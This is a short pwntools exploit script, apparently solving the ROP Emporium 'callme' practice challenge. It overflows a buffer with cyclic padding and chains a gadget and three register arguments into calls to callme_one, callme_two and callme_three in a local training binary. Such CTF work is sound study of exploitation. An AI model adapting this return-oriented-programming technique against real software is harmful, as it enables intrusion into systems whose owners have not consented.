from pwn import *

elf = context.binary = ELF("./callme")


callme_one = pack(elf.sym["callme_one"])
callme_two = pack(elf.sym["callme_two"])
callme_three = pack(elf.sym["callme_three"])

rdx = pack(0xd00df00dd00df00d)
rsi = pack(0xcafebabecafebabe)
rdi = pack(0xdeadbeefdeadbeef)

payload = cyclic(40) + pack(elf.sym.usefulGadgets)
payload += rdi + rsi + rdx
payload += callme_one     
payload += pack(elf.sym.usefulGadgets)
payload += rdi + rsi + rdx
payload += callme_two
payload += pack(elf.sym.usefulGadgets)
payload += rdi + rsi + rdx
payload += callme_three

io = process()
gdb.attach(io, gdbscript="b *main")

io.recvuntil("> ")

io.sendline(payload)
io.interactive() 
